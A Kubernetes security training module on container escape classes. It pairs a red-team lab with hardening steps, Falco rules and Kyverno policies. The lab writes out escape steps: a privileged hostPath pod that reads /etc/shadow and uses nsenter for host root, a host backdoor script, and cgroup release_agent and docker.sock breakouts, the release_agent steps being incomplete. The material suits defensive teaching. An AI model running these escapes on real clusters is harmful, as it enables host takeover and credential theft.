# 08 — Container Escape Classes

> **Level:** Advanced
> **Prereqs:** [K8s Attack Surface Overview](k8s-attack-surface-overview.md) (K8s Attack Surface Overview), [Pod Security Admission & PSP Replacements](pod-security-admission-and-psp-replacements.md) (Pod Security Admission)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Execution, Privilege Escalation, Defense Evasion (see ATT&CK Containers matrix)
**Authorization scope:** All escape demonstrations target a local `kind` cluster you own. No live PoCs against unowned infrastructure. Node access is simulated within a lab environment.

## What & why

Container escape is the act of breaking out of the container isolation boundary to gain code execution on the underlying host. Each escape class — privileged containers, dangerous capabilities, unconfined seccomp, hostPath mounts, kernel CVEs — is a distinct failure mode of the isolation model. Understanding the taxonomy of escape primitives is how you design admission policies and runtime detection that actually stop them.

## The OnPrem reality

Before containers, hypervisor escapes were the canonical breakout: a guest VM exploiting a vulnerability to execute code on the ESXi/KVM/Hyper-V host. Container escapes are conceptually identical but operate across a thinner isolation layer (Linux namespaces + cgroups + capabilities instead of full hardware virtualization). On-prem data centers running bare-metal K8s nodes face the same escape classes as cloud-hosted nodes, but the blast radius on-prem can reach physical infrastructure management networks.

## Core concepts

### The container isolation stack

```
Application (container process)
        ↓
seccomp filter (syscall allowlist)   ← weakest layer if unset
user namespace (UID 0→unprivileged)  ← optional
capabilities(7) bitmask              ← drops root powers
cgroups v2 (resource limits)         ← not a security boundary
Linux namespaces (pid, net, mnt...)  ← the primary isolation
        ↓
Host kernel                          ← ONE kernel for all containers
        ↓
Hypervisor (if VM-hosted node)       ← second boundary (cloud only)
```

### Escape class taxonomy

| Escape Class | Mechanism | Signal of Exploitation | Mitigation Priority |
|---|---|---|---|
| **Privileged container** | `securityContext.privileged: true` grants all capabilities + access to all host devices (`/dev/*`) | `nsenter -t 1 -a sh` succeeds inside container | Critical — block via PSA/Admission |
| **Dangerous capabilities** | `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN`, `CAP_SYS_MODULE` enable specific escapes | `mount -t cgroup` or `insmod` from inside container | High — drop ALL; add back one by one |
| **hostPath mount** | Mounting host directories (`/`, `/var/run/docker.sock`, `/proc`, `/sys`) | `cat /host/etc/shadow` works from container | Critical — block via PSA restricted |
| **Missing seccomp profile** | Default seccomp blocks ~40% of syscalls; unconfined allows all ~300 | `unshare -U` or `clone` syscalls succeed | High — enforce `RuntimeDefault` |
| **User namespace escape** | When user namespaces not enabled, container root (UID 0) = host root | `id` shows `uid=0(root)` with no user namespace mapping | Medium — `runAsNonRoot` or user namespaces |
| **Kernel CVE** | Vulnerability in kernel code reachable from a container syscall (e.g., CVE-2022-0185, CVE-2022-0492) | Kernel panic or unexpected privilege change | Critical — patch kernel; managed node OS auto-patches |
| **docker.sock / CRI socket mount** | Mounting the container runtime socket inside a container gives API control over all containers on the host | `docker ps` from inside container shows all host containers | Critical — never mount socket inside container |
| **cgroup v1 release_agent** | `CAP_SYS_ADMIN` + writable cgroup `release_agent` → host command execution | Write command to `release_agent` file in cgroup hierarchy | High — use cgroups v2 or block `CAP_SYS_ADMIN` |

### Capability escape mapping

| Capability | Escape Vector |
|---|---|
| `CAP_SYS_ADMIN` | Mount host filesystems, load kernel modules, modify namespaces, `nsenter` host |
| `CAP_SYS_PTRACE` | `ptrace` host processes in same PID namespace; inject code into kubelet |
| `CAP_NET_ADMIN` | Modify host network interfaces, ARP poisoning, `iptables` manipulation |
| `CAP_SYS_MODULE` | `insmod` a kernel module → ring-0 kernel execution |
| `CAP_SYS_RAWIO` | Direct I/O to host devices via `/dev/mem`, `/dev/kmem` |
| `CAP_DAC_READ_SEARCH` | Bypass file read permissions → read host `/etc/shadow` without hostPath mount |
| `CAP_BPF` | Load eBPF programs into kernel → traffic interception, rootkit |

## AWS

**Managed node OS protections:**

| AWS Node OS | Escape Mitigations |
|---|---|
| Bottlerocket | Immutable root FS, no package manager, no SSH, SELinux enforcing, seccomp by default, dm-verity |
| Amazon Linux 2 (EKS optimized) | SELinux enforcing (configurable), kernel live-patching via KernelCare, seccomp default |
| Ubuntu (EKS) | AppArmor profiles per container (K8s 1.27+), seccomp default |

**AWS Bottlerocket — verify runtime protections:**

```bash
# AWS — Bottlerocket nodes don't allow SSH; use SSM
aws ssm start-session --target i-1111111111111111

# Check SELinux enforcing
getenforce
# Expected: Enforcing

# Bottlerocket: verify dm-verity on root partition
veritysetup status root
```

**EKS node hardening via launch template:**

```bash
# AWS — launch template user-data for kernel hardening
#!/bin/bash
echo "kernel.kptr_restrict=2" >> /etc/sysctl.d/99-hardening.conf
echo "kernel.dmesg_restrict=1" >> /etc/sysctl.d/99-hardening.conf
echo "kernel.unprivileged_bpf_disabled=1" >> /etc/sysctl.d/99-hardening.conf
echo "kernel.yama.ptrace_scope=2" >> /etc/sysctl.d/99-hardening.conf
sysctl --system
```

## Azure

**Managed node OS protections:**

```bash
# Azure — AKS with Azure Linux (Mariner) container host
az aks create \
  --name cluster-sec \
  --resource-group rg-sec \
  --os-sku AzureLinux \
  --node-vm-size Standard_D2s_v3

# Azure Linux features: read-only root FS, dm-verity, SELinux enforcing
```

**Verify SELinux on AKS nodes:**

```bash
# Azure — via AKS run command or SSH to node
az aks command invoke \
  --resource-group rg-sec \
  --name cluster-sec \
  --command "getenforce; cat /etc/os-release"
```

## GCP

**Managed node OS protections:**

| GCP Node OS | Escape Mitigations |
|---|---|
| Container-Optimized OS (COS) | Immutable root FS, locked-down kernel, no package manager, verified boot, SELinux enforcing |
| Ubuntu (GKE) | AppArmor enabled, seccomp RuntimeDefault mandatory on GKE Autopilot |

**GKE Shielded Nodes (integrity verification):**

```bash
# GCP — enable Shielded Nodes (default on GKE)
gcloud container clusters create cluster-sec \
  --zone=us-central1-a \
  --enable-shielded-nodes \
  --enable-dataplane-v2

# GCP — verify secure boot and integrity monitoring
gcloud compute instances describe gke-cluster-sec-default-pool-xxxx \
  --zone=us-central1-a \
  --format="json(shieldedInstanceConfig,shieldedInstanceIntegrityPolicy)"
```

**COS: verify runtime protections:**

```bash
# GCP — SSH to a COS node
gcloud compute ssh gke-cluster-sec-default-pool-xxxx --zone=us-central1-a

# COS: root filesystem is read-only
mount | grep " / "
# Expected: ro,... on / type ext4

# COS: check loaded seccomp profiles
ls /var/lib/kubelet/seccomp/
```

## OnPrem (self-managed)

**Talos Linux (K8s-optimized OS for on-prem):**

```bash
# OnPrem — Talos Linux: no SSH, no shell, all management via API
talosctl containers -n 192.168.1.10
# All K8s components run as containers; host is API-only

# Verify seccomp defaults on any Linux node
grep Seccomp /boot/config-$(uname -r)
# Expected: CONFIG_SECCOMP=y
```

**Sysctl hardening on any Linux K8s node:**

```bash
# OnPrem
cat <<SYSCTL >> /etc/sysctl.d/99-container-hardening.conf
# Prevent container namespace escapes
user.max_user_namespaces = 0
# Unprivileged eBPF disabled
kernel.unprivileged_bpf_disabled = 1
# kptr restrict — prevent kernel pointer leaks
kernel.kptr_restrict = 2
# Restrict perf_event_open to reduce side-channel surface
kernel.perf_event_paranoid = 3
# Yama ptrace scope (prevents ptrace escapes)
kernel.yama.ptrace_scope = 2
SYSCTL
sysctl --system
```

**AppArmor profile for containers:**

```bash
# OnPrem — load a restrictive AppArmor profile
aa-enforce /etc/apparmor.d/docker-restricted
# Reference in pod spec: container.apparmor.security.beta.kubernetes.io/<name>=localhost/docker-restricted
```

## OnPrem mapping (recap table)

| Escape Class | OnPrem Mitigation | AWS Mitigation | Azure Mitigation | GCP Mitigation |
|---|---|---|---|---|
| Privileged containers | PSA restricted + OPA/Kyverno | PSA + Kyverno | PSA + Azure Policy | PSA restricted (Autopilot) or Policy Controller |
| Dangerous capabilities | Drop all via SecurityContext + PSA baseline | PSA baseline `restricted` drops all | PSA baseline | GKE Autopilot drops all by default |
| hostPath mounts | PSA restricted blocks all hostPath | PSA restricted | PSA restricted | GKE Autopilot blocks all hostPath |
| Missing seccomp | `RuntimeDefault` via SecurityContext | `RuntimeDefault` on Bottlerocket/AL2 | `RuntimeDefault` on Azure Linux | Mandatory on GKE Autopilot |
| Kernel CVE | Self-patch; livepatch via `kpatch` | Kubelet auto-upgrade / Bottlerocket auto-apply | AKS node image auto-upgrade | COS auto-update; GKE node auto-upgrade |
| Node OS hardening | Talos / Flatcar / custom | Bottlerocket (immutable) | Azure Linux (dm-verity) | COS (immutable + verified boot) |
| Runtime detection | Falco + custom seccomp notify | Falco + GuardDuty EKS | Falco + MDC (Defender for Containers) | Falco + Security Command Center |
| Runtime enforcement | seccomp notify → kill container | seccomp notify | seccomp notify | seccomp notify |

## 🔴 Red Team view

**Contained escape demonstration on local `kind` cluster**

**Scope:** This lab runs entirely on a local `kind` cluster you own. The escape is demonstrated in a controlled lab; the same techniques blocked by the Blue controls below.

### Class 1: Privileged container + hostPath → host filesystem read

**Step 1 — Deploy privileged pod with host root mount:**

```bash
kind create cluster --name escape-lab

kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-hostpath
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: escape
      image: alpine
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: hostroot
          mountPath: /host
  volumes:
    - name: hostroot
      hostPath:
        path: /
EOF
```

**Step 2 — Escape: read host secrets and access host namespaces:**

```bash
kubectl exec -it escape-hostpath -- sh

# Read host shadow file
cat /host/etc/shadow

# List processes on the host (since hostPID=true)
ps aux

# Use nsenter to join host namespace and run a command AS the host
nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname'
# uid=0(root) gid=0(root) — full host root

# Access kubelet's service account (on a real K8s node, this is cluster-admin)
cat /host/var/lib/kubelet/config.yaml 2>/dev/null
```

**Step 3 — Write persistence to the host:**

```bash
# Inside the escaped context (nsenter or hostPath write)
echo '#!/bin/sh' > /host/tmp/backdoor.sh
echo 'curl http://localhost:8080/rce' >> /host/tmp/backdoor.sh
# chmod +x /host/tmp/backdoor.sh
```

### Class 2: CAP_SYS_ADMIN escape via cgroup release_agent

**Step 1 — Deploy pod with CAP_SYS_ADMIN:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-cap-sys-admin
  namespace: default
spec:
  containers:
    - name: escape
      image: alpine
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          add: ["SYS_ADMIN"]
        privileged: false
```

**Step 2 — cgroup release_agent escape (lab only, cgroups v1 required):**

```bash
kubectl exec -it escape-cap-sys-admin -- sh

mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo $$

# Set release_agent to a script that runs on the host
echo '#!/bin/sh' > /cmd
echo 'id >> /tmp/escape-output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# On cgroups v1, the release_agent fires when the cgroup dies
# (This technique is blocked on cgroups v2 — verify with `mount | grep cgroup2`)
```

**Note:** cgroups v2 (default on modern K8s) is immune to the `release_agent` escape. This technique is shown for educational completeness — most cloud managed K8s use cgroups v2.

### Class 3: docker.sock mount → container breakout

```yaml
# YAML that would enable this escape if not blocked by admission
apiVersion: v1
kind: Pod
metadata:
  name: escape-docker-sock
spec:
  containers:
    - name: escape
      image: docker
      command: ["docker", "run", "-it", "--privileged", "--pid=host", "alpine", "nsenter", "-t", "1", "-a", "sh"]
      volumeMounts:
        - name: dockersock
          mountPath: /var/run/docker.sock
  volumes:
    - name: dockersock
      hostPath:
        path: /var/run/docker.sock
```

**Artifacts left (all escape classes):**
- K8s audit log: Pod create with `privileged: true` / `capabilities.add: ["SYS_ADMIN"]` / `hostPath.path: /` / `hostPath.path: /var/run/docker.sock`
- Node filesystem: New files in `/tmp`, modified atime on `/etc/shadow`
- Falco alert: `nsenter` syscall from container, container mount cgroup, `openat` on `/etc/shadow` from container PID
- CloudTrail (if cloud-managed): `RegisterNode` API calls the node shouldn't make

## 🔵 Blue Team view

**Detection signals and queries:**

| Signal | Log Source | Query |
|---|---|---|
| `nsenter` syscall from container | Falco | `evt.type=setns and container and proc.name=nsenter` |
| `mount` syscall to cgroup from container | Falco | `evt.type=mount and container and proc.name=mount and fd.name contains cgroup` |
| Pod with `hostPath: /` | K8s audit | `verb=create resource=pods` and request body contains `hostPath.path=/` |
| Pod with `hostPath: /var/run/docker.sock` | K8s audit | `verb=create resource=pods` and request body contains `docker.sock` |
| `openat` of `/etc/shadow` from container | Falco | `evt.type=openat and container and fd.name=/etc/shadow` |
| Process with `CAP_SYS_ADMIN` effective | Falco | `evt.type=capset and container` |
| Privilege escalation (UID change to 0) | Falco | `evt.type=setuid and container and proc.vpid!=1 and uid=0` |

**Falco rules for escape detection:**

```yaml
# Escape: nsenter to join host namespace
- rule: Container Escape via nsenter
  desc: Detect nsenter attempt from inside a container
  condition: >
    container and proc.name=nsenter and
    (proc.args contains "-t 1" or proc.args contains "--target 1")
  output: "nsenter escape attempt (container=%container.name pid=%proc.pid args=%proc.args)"
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Escape: mount cgroup filesystem inside container
- rule: Cgroup Mount Inside Container
  desc: Detect mount of cgroup filesystem (release_agent escape precursor)
  condition: >
    container and evt.type=mount and
    (proc.name=mount and proc.args contains cgroup)
  output: "cgroup mount inside container (name=%container.name args=%proc.args)"
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Escape: access to /etc/shadow from container
- rule: Host Shadow Accessed from Container
  desc: Detect read of /etc/shadow via hostPath mount
  condition: >
    container and evt.type=openat and fd.name=/etc/shadow
  output: "Host shadow read from container (name=%container.name proc=%proc.name)"
  priority: CRITICAL
  tags: [container, escape, mitre_credential_access]
```

**Preventive controls — admission policies:**

```yaml
# Kyverno: comprehensive escape prevention policy
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-container-escape
spec:
  validationFailureAction: Enforce
  rules:
    - name: deny-privileged
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        message: "Privileged containers forbidden"
        pattern:
          spec:
            containers:
              - securityContext:
                  privileged: "false"

    - name: deny-hostpath-root-and-sock
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        message: "hostPath mounts to /, /var/run/docker.sock, /proc, /sys forbidden"
        pattern:
          spec:
            =(volumes):
              - =(hostPath):
                  path: "!/*"   # blocks /
              - =(hostPath):
                  path: "!/var/run/docker.sock"
              - =(hostPath):
                  path: "!/proc"
              - =(hostPath):
                  path: "!/sys"

    - name: deny-cap-sys-admin
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        message: "CAP_SYS_ADMIN forbidden"
        pattern:
          spec:
            containers:
              - securityContext:
                  capabilities:
                    add: "!SYS_ADMIN"

    - name: require-seccomp
      match:
        any:
          - resources:
              kinds: [Pod]
      validate:
        message: "seccompProfile RuntimeDefault required"
        pattern:
          spec:
            containers:
              - securityContext:
                  seccompProfile:
                    type: RuntimeDefault
```

**Response playbook — confirmed container escape:**

1. **Isolate the node:** `kubectl cordon <node>` — prevent new pods.
2. **Capture forensics:** `kubectl exec` into the escaped pod (if still running) and tarball `/tmp`, `/var/log`. Capture `dmesg` from the node.
3. **Drain and terminate:** `kubectl drain <node> --force --ignore-daemonsets --delete-emptydir-data`.
4. **Check all other nodes:** Run the same `kubectl get pods -A -o json | jq` checks for privileged pods on other nodes.
5. **Audit node IAM credentials:** If the node had an IAM instance profile (AWS) / managed identity (Azure) / service account (GCP), rotate those credentials immediately.
6. **Rebuild node from fresh AMI:** Do not reuse the compromised node image; launch a new one.
7. **Review audit logs:** Search for the pod creator identity and determine how the privileged pod was deployed.

## Hands-on lab

**Goal:** Execute a contained `kind` escape via privileged pod + hostPath → detect with Falco → block with Kyverno → retry and confirm blocked.

**Prerequisites:** `kind`, `kubectl`, `helm`, `falco` (or `falco-driver-loader`), `kyverno`.

**Steps:**
1. `kind create cluster --name escape-lab`
2. Install Falco with K8s audit log plugin: `helm install falco falcosecurity/falco --set falco.driver.kind=module`
3. In a separate terminal: `kubectl logs -f -l app.kubernetes.io/name=falco`
4. Deploy the privileged `escape-hostpath` pod from the Red Team section above.
5. Exec inside: `kubectl exec -it escape-hostpath -- nsenter -t 1 -a sh`
6. Observe Falco alert: `Container Escape via nsenter` fires.
7. Delete the pod: `kubectl delete pod escape-hostpath --force`
8. Install Kyverno: `helm install kyverno kyverno/kyverno -n kyverno --create-namespace`
9. Apply the `prevent-container-escape` ClusterPolicy from the Blue section.
10. Retry deploying the escape pod — Kyverno rejects it.
11. Teardown: `kind delete cluster --name escape-lab`

**Expected output:** Escape succeeds when no admission control is present; Falco detects `nsenter` and `openat` to `/etc/shadow`. After Kyverno policy, the privileged pod is rejected at admission time.

## Detection rules & checklists

**CLI audit one-liners:**

```bash
# All clouds: find pods with dangerous capabilities
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.capabilities.add[]? | test("SYS_ADMIN|SYS_MODULE|SYS_PTRACE|NET_ADMIN")) | "\(.metadata.namespace)/\(.metadata.name) caps=\(.spec.containers[].securityContext.capabilities.add)"'

# All clouds: find pods with hostPID or hostIPC
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.hostPID==true or .spec.hostIPC==true) | {ns: .metadata.namespace, name: .metadata.name, hostPID: .spec.hostPID, hostIPC: .spec.hostIPC}'

# All clouds: find pods without seccomp profile set
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.seccompProfile.type?==null) | "\(.metadata.namespace)/\(.metadata.name)"'

# EKS: check Bottlerocket node count (launch template osType)
aws ec2 describe-instances \
  --filters "Name=tag:kubernetes.io/cluster/cluster-sec,Values=owned" \
  --query 'Reservations[].Instances[].{Id:InstanceId,AMI:ImageId}' \
  --region us-east-1

# AKS: check node OS type
az aks nodepool list --cluster-name cluster-sec --resource-group rg-sec \
  --query "[].{name:name, osSku:osSku, mode:mode}"

# GKE: check Shielded Nodes status
gcloud container node-pools list --cluster=cluster-sec --zone=us-central1-a \
  --format="json(config.shieldedInstanceConfig)"
```

**Node validation checklist:**

- [ ] All nodes run an immutable-root OS (Bottlerocket / Azure Linux / COS / Talos).
- [ ] `getenforce` returns `Enforcing` or AppArmor is loaded with profiles.
- [ ] `kernel.unprivileged_bpf_disabled=1` on all nodes.
- [ ] `kernel.yama.ptrace_scope` >= 1.
- [ ] No pods with `securityContext.privileged: true` outside `kube-system`.
- [ ] No pods with `hostPath` mounts to `/`, `/var/run/docker.sock`, `/proc`, or `/sys`.
- [ ] All pods have `seccompProfile.type: RuntimeDefault` (via Kyverno mutation).
- [ ] cgroups v2 in use: `mount | grep cgroup2` returns output on all nodes.

## References

- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes
- Linux capabilities(7): https://man7.org/linux/man-pages/man7/capabilities.7.html
- seccomp in K8s: https://kubernetes.io/docs/tutorials/security/seccomp/
- Bottlerocket security: https://bottlerocket.dev/en/latest/security/
- GKE COS node hardening: https://cloud.google.com/container-optimized-os/docs/concepts/security
- Azure Linux (Mariner) security: https://github.com/microsoft/CBL-Mariner
- ATT&CK Containers: see Privilege Escalation, Execution tactics
- Cross-links: [`03-05-k8s-attack-surface-overview.md`](k8s-attack-surface-overview.md), [`03-07-pod-security-admission-and-psp-replacements.md`](pod-security-admission-and-psp-replacements.md), [`03-09-image-signing-and-admission-controllers.md`](image-signing-and-admission-controllers.md)
